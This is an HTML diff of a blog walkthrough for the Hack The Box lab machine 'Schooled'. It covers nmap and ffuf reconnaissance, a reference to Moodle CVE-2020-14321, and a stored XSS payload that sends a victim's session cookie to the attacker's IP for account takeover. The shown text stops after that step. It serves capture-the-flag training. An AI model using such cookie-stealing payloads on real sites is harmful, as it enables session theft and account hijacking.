@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 FreeBSDDifficulty:	MediumPoints:	30Release:	03 Apr 2021IP:	10.10.10.234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[schooled]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/04/09/schooled/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 FreeBSDDifficulty:	MediumPoints:	30Release:	03 Apr 2021IP:	10.10.10.234">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1915.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1916.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1917.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1918.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1919.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1920.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1921.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1922.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1923.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1924.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1925.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1926.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1927.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1928.jpg">
+<meta property="article:published_time" content="2021-04-09T15:24:07.000Z">
+<meta property="article:modified_time" content="2021-09-11T21:11:15.643Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1915.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/04/09/schooled/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/04/09/schooled/","path":"2021/04/09/schooled/","title":"Hack-The-Box-walkthrough[schooled]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[schooled] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ENUMERATION"><span class="nav-number">3.</span> <span class="nav-text">ENUMERATION</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-shell"><span class="nav-number">4.</span> <span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Trigger-RCE"><span class="nav-number">5.</span> <span class="nav-text">Trigger RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#privilege-esclation"><span class="nav-number">6.</span> <span class="nav-text">privilege esclation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">7.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">8.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/04/09/schooled/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[schooled] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[schooled]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-09 23:24:07" itemprop="dateCreated datePublished" datetime="2021-04-09T23:24:07+08:00">2021-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-09-12 05:11:15" itemprop="dateModified" datetime="2021-09-12T05:11:15+08:00">2021-09-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 FreeBSD<br>Difficulty:	Medium<br>Points:	30<br>Release:	03 Apr 2021<br>IP:	10.10.10.234</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1915.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/schooled]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.234</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/<span class="number">7.4</span>.<span class="number">15</span>)</span><br><span class="line"><span class="number">33060</span>/tcp open  mysqlx?</span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=<span class="number">7.91</span>%I=<span class="number">7</span>%D=<span class="number">4</span>/<span class="number">9</span>%Time=<span class="number">60707339</span>%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(GenericLines,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x</span><br><span class="line">SF:<span class="number">08</span>\x05\x1a\<span class="number">0</span>&quot;)%r(GetRequest,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(HTTPOpt</span><br><span class="line">SF:ions,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(RTSPRequest,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\</span><br><span class="line">SF:x08\x05\x1a\<span class="number">0</span>&quot;)%r(RPCCheck,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(DNSVersi</span><br><span class="line">SF:onBindReqTCP,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(DNSStatusRequestTCP,<span class="number">2</span>B</span><br><span class="line">SF:,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x0fIn</span><br><span class="line">SF:valid\x20message\&quot;\x05HY000&quot;)%r(Help,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%</span><br><span class="line">SF:r(SSLSessionReq,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\</span><br><span class="line">SF:x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCookie,</span><br><span class="line">SF:<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(TLSSessionReq,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x0</span><br><span class="line">SF:<span class="number">8</span>\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\</span><br><span class="line">SF:x05HY000&quot;)%r(Kerberos,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(SMBProgNeg,<span class="number">9</span>,</span><br><span class="line">SF:&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(X11Probe,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x</span><br><span class="line">SF:<span class="number">1</span>a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY00</span><br><span class="line">SF:<span class="number">0</span>&quot;)%r(FourOhFourRequest,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(LPDString,<span class="number">9</span></span><br><span class="line">SF:,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(LDAPSearchReq,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08</span><br><span class="line">SF:\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x</span><br><span class="line">SF:<span class="number">05</span>HY000&quot;)%r(LDAPBindReq,<span class="number">46</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\x009\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x</span><br><span class="line">SF:<span class="number">08</span>\x01\x10\x88&#x27;\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20mes</span><br><span class="line">SF:sage\&quot;\x05HY000&quot;)%r(SIPOptions,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(LAND</span><br><span class="line">SF:esk-RC,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(TerminalServer,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line">SF:\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(NCP,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(NotesRPC</span><br><span class="line">SF:,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x0</span><br><span class="line">SF:fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1</span><br><span class="line">SF:a\<span class="number">0</span>&quot;)%r(WMSRequest,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>&quot;)%r(oracle-tns,<span class="number">32</span>,&quot;\</span><br><span class="line">SF:x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>%\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\x88&#x27;\x1a\x16Invalid\</span><br><span class="line">SF:x20message-frame\.\&quot;\x05HY000&quot;)%r(ms-sql-s,<span class="number">9</span>,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1</span><br><span class="line">SF:a\<span class="number">0</span>&quot;)%r(afp,<span class="number">2</span>B,&quot;\x05\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x0b\x08\x05\x1a\<span class="number">0</span>\x1e\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\x01\x08\x01\x10\</span><br><span class="line">SF:x88&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);</span><br><span class="line">Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd</span><br></pre></td></tr></table></figure>
+
+<h3 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h3><p>After some enumeration i got some users list, then i got subdomain</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admissions@schooled.htb</span><br><span class="line">schooled.htb</span><br></pre></td></tr></table></figure>
+
+<p>ran ffuf to find sub-enumeration its very fast<br>Compare to gobuster </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/root/ffuf/ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H <span class="string">&#x27;Host: FUZZ.schooled.htb&#x27;</span></span><br><span class="line"></span><br><span class="line">moodle         [Status: 200, Size: 84, Words: 5, Lines: 2]  </span><br></pre></td></tr></table></figure>
+
+<p>then add moodle.schooled.htb to your &#x2F;etc&#x2F;hosts</p>
+<p>create new account</p>
+<p>make sure set mail id <yourname>@student.schooled.htb</p>
+<p>continue</p>
+<p>its running on moodle</p>
+<p>After some google search i found latest rce for this version 3.9🤩</p>
+<p>its vulnerable to CVE-2020-14321</p>
+<p>Here is a some reference about this exploit, and how to perform😉</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Ca0VJbkZJNG9JVQ==">moodle​ RCE | CVE​-2020-14321 PoC<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hvYW5nS2llbjEwMjAvQ1ZFLTIwMjAtMTQzMjE=">CVE-2020-14321<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Before do this exploit we become manager<br>So lets switch user to teacher Though xss-account Takeover<br>ACCOUNT TAKEOVER (Student to Teacher)</p>
+<ul>
+<li>hint for xss:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://moodle.schooled.htb/moodle/mod/forum/user.php?<span class="built_in">id</span>=24&amp;mode=discussions</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>edit profile:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://moodle.schooled.htb/moodle/user/profile.php?<span class="built_in">id</span>=28</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>put our payload on moodlenet</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://moodle.schooled.htb/moodle/user/edit.php</span><br></pre></td></tr></table></figure>
+
+<p>Here is the payload i used :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=this.src=<span class="string">&#x27;http://10.10.14.7:8000/?&#x27;</span>+document.cookie;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Then open your terminal run python -m SimpleHTTPServer (python server) for to catch Manuel Phillip’s cookie</p>
+<p>Enroll the course and check the server(our python server)</p>
